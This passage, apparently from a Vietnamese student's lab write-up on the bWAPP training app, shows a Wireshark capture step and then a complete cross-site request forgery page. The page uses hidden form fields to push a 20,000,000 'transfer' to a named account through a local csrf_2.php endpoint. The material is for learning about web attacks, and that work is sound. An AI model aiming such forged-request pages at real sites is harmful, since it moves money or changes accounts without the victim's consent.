Tiếp tục capture với Wireshark để lấy method, sau đó xài payload tương ứng trong phishing html:

![image](https://github.com/NVex0/Cong_nghe_web_an_toan/assets/113530029/8cbba0fb-f672-4e3f-862e-602773d43530)

Method là GET. HTML sẽ như sau:

```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="http://localhost/bwapp/csrf_2.php">
<input type="hidden" name="account" value="TranManhHung" />
<input type="hidden" name="amount" value="20000000" />
<input type="hidden" name="action" value="transfer" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```

